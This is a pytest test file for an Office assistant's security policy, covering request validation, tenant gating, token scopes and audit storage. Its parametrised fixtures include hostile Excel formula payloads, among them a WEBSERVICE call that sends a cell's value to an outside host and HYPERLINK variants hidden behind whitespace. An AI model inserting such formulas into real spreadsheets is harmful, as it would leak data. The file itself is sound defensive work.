"""Security and contract tests for the Microsoft Office assistant foundation."""

import json
from unittest.mock import AsyncMock, patch
from uuid import UUID

import pytest
from fastapi import HTTPException
from pydantic import ValidationError
from sqlalchemy import select

from app.models.office_action_run import OfficeActionRun
from app.schemas.office_assistant import GeneratedPlan, OfficePlanRequest
from app.services.llm_routing import LLMRoute
from app.services.office_action_policy import OfficePolicyError, office_action_policy
from app.utils.oauth_security import verify_microsoft_access_token


FINGERPRINT = "sha256:" + "a" * 64


def _word_request(*, text: str = "Original indemnity clause") -> dict:
    return {
        "context": {
            "surface": "word",
            "scope": "selection",
            "capturedAt": "2026-07-27T14:00:00Z",
            "documentFingerprint": FINGERPRINT,
            "hostCapabilities": {
                "surface": "word",
                "requirementSets": {"WordApi_1_1": True},
                "readableScopes": ["selection"],
                "supportedActions": ["replace_selection"],
                "writeEnabled": True,
            },
            "selection": {
                "kind": "text",
                "text": text,
                "charCount": len(text),
                "selectionHash": FINGERPRINT,
            },
        },
        "instruction": "Narrow the clause to direct third-party claims.",
    }


def _excel_request() -> OfficePlanRequest:
    return OfficePlanRequest.model_validate(
        {
            "context": {
                "surface": "excel",
                "scope": "selection",
                "capturedAt": "2026-07-27T14:00:00Z",
                "documentFingerprint": FINGERPRINT,
                "hostCapabilities": {
                    "surface": "excel",
                    "requirementSets": {"ExcelApi_1_1": True},
                    "readableScopes": ["selection"],
                    "supportedActions": ["set_selected_formulas"],
                    "writeEnabled": True,
                },
                "selection": {
                    "kind": "range",
                    "address": "Sheet1!A1:B1",
                    "rowCount": 1,
                    "columnCount": 2,
                    "values": [[1, 2]],
                    "formulas": [[1, 2]],
                    "numberFormats": [["0", "0"]],
                    "selectionHash": FINGERPRINT,
                },
            },
            "instruction": "Calculate totals.",
        }
    )


def test_contract_rejects_unknown_context_fields():
    raw = _word_request()
    raw["context"]["wholeDocument"] = "secret"
    with pytest.raises(ValidationError):
        OfficePlanRequest.model_validate(raw)


def test_policy_binds_word_action_to_server_validated_fingerprint():
    request = OfficePlanRequest.model_validate(_word_request())
    generated = GeneratedPlan.model_validate(
        {
            "summary": "Narrow the selected clause",
            "warnings": ["Attorney review required"],
            "actions": [
                {
                    "type": "replace_selection",
                    "content": {"text": "Narrow replacement", "format": "text"},
                }
            ],
        }
    )
    actions = office_action_policy.bind_actions(request.context, generated)
    assert actions[0].anchor.selection_hash == FINGERPRINT


def test_policy_rejects_external_or_volatile_excel_formula():
    request = _excel_request()
    generated = GeneratedPlan.model_validate(
        {
            "summary": "Fetch external values",
            "warnings": [],
            "actions": [
                {
                    "type": "set_selected_formulas",
                    "content": {
                        "formulas": [['=WEBSERVICE("https://example.com")', "=NOW()"]]
                    },
                }
            ],
        }
    )
    with pytest.raises(OfficePolicyError, match="not allowed") as exc:
        office_action_policy.bind_actions(request.context, generated)
    assert exc.value.code == "unsafe_formula"


def _values_plan(values: list[list]) -> GeneratedPlan:
    return GeneratedPlan.model_validate(
        {
            "summary": "Write values",
            "warnings": [],
            "actions": [{"type": "set_selected_values", "content": {"values": values}}],
        }
    )


def _excel_values_request() -> OfficePlanRequest:
    request = _excel_request()
    request.context.host_capabilities.supported_actions = ["set_selected_values"]
    return request


@pytest.mark.parametrize(
    "value",
    [
        '=WEBSERVICE("https://x.example/?"&A1)',
        '=HYPERLINK("https://x.example","Open")',
        '+HYPERLINK("https://x.example")',
        "-2+3",
        "@SUM(A1:A2)",
        "=[Book1]Sheet1!A1",
        "=NOW()",
        "=1+1",
        '  =WEBSERVICE("https://x.example")',
        '\t=HYPERLINK("https://x.example")',
        '\r\n=HYPERLINK("https://x.example")',
        "+1 555 0100",
        "-",
    ],
)
def test_policy_refuses_formulas_smuggled_in_as_excel_values(value):
    # Excel parses a string written through range.values as a formula when it
    # starts with =, +, - or @, so these would skip the unsafe-formula ban.
    request = _excel_values_request()
    with pytest.raises(OfficePolicyError, match="set_selected_formulas") as exc:
        office_action_policy.bind_actions(request.context, _values_plan([[1, value]]))
    assert exc.value.code == "formula_in_values"


@pytest.mark.parametrize(
    "value",
    [
        -5,
        -1.25,
        0,
        True,
        None,
        "-5",
        "+1.5",
        " -1e3 ",
        "-.5",
        "Total = 12",
        "Smith v. Jones",
        "",
        "1-800-555-0100",
    ],
)
def test_policy_allows_plain_excel_values(value):
    request = _excel_values_request()
    actions = office_action_policy.bind_actions(
        request.context, _values_plan([[value, "Paid"]])
    )
    assert actions[0].type == "set_selected_values"
    assert actions[0].content.values == [[value, "Paid"]]


def test_office_pilot_allowlist_is_exact_and_fail_closed(monkeypatch):
    from app.services import office_access

    tenant_id = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
    monkeypatch.setattr(office_access.settings, "OFFICE_ASSISTANT_ENABLED", True)
    monkeypatch.setattr(
        office_access.settings,
        "OFFICE_ASSISTANT_PILOT_TENANT_IDS",
        f"not-a-uuid,{tenant_id}",
    )
    with pytest.raises(HTTPException) as malformed:
        office_access.require_office_pilot_tenant(UUID(tenant_id))
    assert malformed.value.status_code == 404

    monkeypatch.setattr(
        office_access.settings, "OFFICE_ASSISTANT_PILOT_TENANT_IDS", tenant_id
    )
    office_access.require_office_pilot_tenant(UUID(tenant_id))


@pytest.mark.asyncio
async def test_office_access_token_requires_delegated_scope_and_client():
    tenant_id = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
    object_id = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb"
    claims = {
        "tid": tenant_id,
        "oid": object_id,
        "scp": "office.access",
        "azp": "office-client",
    }
    with (
        patch(
            "app.utils.oauth_security._decode_jwt_segment",
            side_effect=[{"kid": "key-1"}, claims],
        ),
        patch(
            "app.utils.oauth_security._fetch_jwks",
            new=AsyncMock(return_value={"keys": [{"kid": "key-1"}]}),
        ),
        patch("app.utils.oauth_security.jwk.construct", return_value=object()),
        patch("app.utils.oauth_security.jwt.decode", return_value=claims),
    ):
        verified = await verify_microsoft_access_token(
            "header.payload.signature",
            audience="api://clarity",
            required_scope="office.access",
            client_id="office-client",
        )
    assert verified["oid"] == object_id

    missing_scope = {**claims, "scp": "other.scope"}
    with (
        patch(
            "app.utils.oauth_security._decode_jwt_segment",
            side_effect=[{"kid": "key-1"}, missing_scope],
        ),
        patch(
            "app.utils.oauth_security._fetch_jwks",
            new=AsyncMock(return_value={"keys": [{"kid": "key-1"}]}),
        ),
        patch("app.utils.oauth_security.jwk.construct", return_value=object()),
        patch("app.utils.oauth_security.jwt.decode", return_value=missing_scope),
    ):
        with pytest.raises(HTTPException) as exc:
            await verify_microsoft_access_token(
                "header.payload.signature",
                audience="api://clarity",
                required_scope="office.access",
                client_id="office-client",
            )
    assert getattr(exc.value, "status_code", None) == 403


@pytest.mark.asyncio
async def test_office_policy_is_feature_gated(client, monkeypatch):
    from app.routers import office_assistant as office_router

    monkeypatch.setattr(office_router.settings, "OFFICE_ASSISTANT_ENABLED", False)
    response = await client.get("/api/office/policy")
    assert response.status_code == 404


@pytest.mark.asyncio
async def test_office_policy_requires_explicit_pilot_tenant(client, monkeypatch):
    from app.routers import office_assistant as office_router

    monkeypatch.setattr(office_router.settings, "OFFICE_ASSISTANT_ENABLED", True)
    monkeypatch.setattr(office_router.settings, "OFFICE_ASSISTANT_PILOT_TENANT_IDS", "")
    response = await client.get("/api/office/policy")
    assert response.status_code == 404


@pytest.mark.asyncio
async def test_plan_and_result_store_metadata_only(
    client,
    db_session,
    test_user,
    monkeypatch,
):
    from app.routers import office_assistant as office_router
    from app.services import office_assistant as office_service_module

    monkeypatch.setattr(office_router.settings, "OFFICE_ASSISTANT_ENABLED", True)
    monkeypatch.setattr(
        office_router.settings,
        "OFFICE_ASSISTANT_PILOT_TENANT_IDS",
        str(test_user.tenant_id),
    )
    route = LLMRoute(
        requested_route="standard",
        resolved_route="standard",
        gateway_alias="lawhand-standard",
    )
    llm_response = json.dumps(
        {
            "summary": "Narrow the selected clause",
            "warnings": ["Attorney review required"],
            "actions": [
                {
                    "type": "replace_selection",
                    "content": {"text": "Narrow replacement", "format": "text"},
                }
            ],
        }
    )
    with (
        patch.object(
            office_service_module,
            "resolve_llm_route",
            new=AsyncMock(return_value=route),
        ),
        patch.object(
            office_service_module.office_assistant_service.llm,
            "complete",
            new=AsyncMock(return_value=(llm_response, 120, 40)),
        ),
    ):
        response = await client.post("/api/office/plans", json=_word_request())

    assert response.status_code == 201, response.text
    plan = response.json()
    assert plan["baseFingerprint"] == FINGERPRINT
    assert plan["actions"][0]["anchor"]["selectionHash"] == FINGERPRINT

    audit_result = await db_session.execute(
        select(OfficeActionRun).where(OfficeActionRun.plan_id == plan["planId"])
    )
    audit = audit_result.scalar_one()
    assert audit.tenant_id == test_user.tenant_id
    assert audit.action_types == ["replace_selection"]
    assert len(audit.instruction_hmac_sha256) == 64
    assert audit.base_fingerprint_hmac_sha256 != FINGERPRINT
    assert not hasattr(audit, "instruction")
    assert not hasattr(audit, "replacement_text")

    result_hash = "sha256:" + "b" * 64
    result_response = await client.post(
        f"/api/office/plans/{plan['planId']}/result",
        json={
            "planId": plan["planId"],
            "status": "applied",
            "actionCount": 1,
            "resultFingerprint": result_hash,
        },
    )
    assert result_response.status_code == 200, result_response.text
    await db_session.refresh(audit)
    assert audit.status == "applied"
    assert audit.result_action_count == 1
    assert audit.result_fingerprint_hmac_sha256 != result_hash


@pytest.mark.asyncio
async def test_office_exchange_links_existing_microsoft_user(
    client,
    db_session,
    test_user,
    monkeypatch,
):
    from app.routers import auth as auth_router

    tenant_id = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
    object_id = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb"
    test_user.oauth_provider = "microsoft"
    test_user.oauth_subject = "legacy-subject"
    await db_session.commit()

    monkeypatch.setattr(auth_router.settings, "OFFICE_ASSISTANT_ENABLED", True)
    monkeypatch.setattr(
        auth_router.settings,
        "OFFICE_ASSISTANT_PILOT_TENANT_IDS",
        str(test_user.tenant_id),
    )
    monkeypatch.setattr(auth_router.settings, "OFFICE_ENTRA_API_AUDIENCE", "api://test")
    monkeypatch.setattr(auth_router.settings, "OFFICE_ENTRA_CLIENT_ID", "office-client")
    verify = AsyncMock(
        return_value={
            "tid": tenant_id,
            "oid": object_id,
            "sub": "legacy-subject",
            "scp": "office.access",
            "azp": "office-client",
        }
    )
    monkeypatch.setattr(auth_router, "verify_microsoft_access_token", verify)

    response = await client.post("/api/auth/office/exchange")
    assert response.status_code == 200, response.text
    assert "access_token=" in response.headers.get("set-cookie", "")
    await db_session.refresh(test_user)
    assert test_user.entra_tenant_id == tenant_id
    assert test_user.entra_object_id == object_id
